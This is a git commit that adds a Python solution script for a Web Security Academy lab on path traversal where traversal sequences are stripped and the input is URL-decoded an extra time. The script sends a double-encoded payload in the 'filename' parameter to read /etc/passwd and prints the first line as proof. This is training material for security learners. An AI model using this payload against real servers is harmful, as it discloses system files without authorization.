2e6b3fac3d0ff20736fb149ecb0df13ba836d976
Ahmed Elqalawii <elqalawii@proton.me>
2023-10-11 09:49:04 +0300

    Added 'File path traversal, traversal sequences stripped with superfluous URL-decode' lab

---
+++ Path traversal/File path traversal, traversal sequences stripped with superfluous URL-decode/file_path_traversal_traversal_sequences_stripped_with_superfluous_url_decode.py
@@ -0,0 +1,51 @@
+#########################################################################################
+#
+# Author: Ahmed Elqalawy (@elqal3awii)
+#
+# Date: 11/10/2023
+#
+# Lab: File path traversal, traversal sequences stripped with superfluous URL-decode
+#
+# Steps: 1. Inject payload into 'filename' query parameter to retrieve
+#           the content of /etc/passwd
+#        2. Extract the first line as a proof
+#
+#########################################################################################
+
+
+###########
+# imports
+###########
+import requests
+from colorama import Fore
+import re
+
+
+#########
+# Main
+#########
+
+# change this to your lab URL
+url = "https://0a5100c8044da09582d0ab5b00380096.web-security-academy.net" 
+
+print(Fore.BLUE + "⟪#⟫ Injection parameter: " + Fore.YELLOW + "filename")
+
+# the payload to retrieve the content of /etc/passwd
+payload = "..%252f..%252f..%252fetc/passwd"
+
+try:
+    # fetch the page with the injected payload
+    injection = requests.get(f"{url}/image?filename={payload}")
+    
+except:
+    print(Fore.RED + "[!] Failed to fetch the page with the injected payload through exception")
+    exit(1)
+
+print(Fore.WHITE + "⦗1⦘ Injecting payload to retrieve the content of /etc/passwd.. " +  Fore.GREEN + "OK")
+
+# extract the first line of /etc/passwd
+first_line = re.findall("(.*)\n", injection.text)[0]
+
+print(Fore.WHITE + "⦗2⦘ Extracting the first line as a proof.. " +  Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + first_line)
+print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")
+
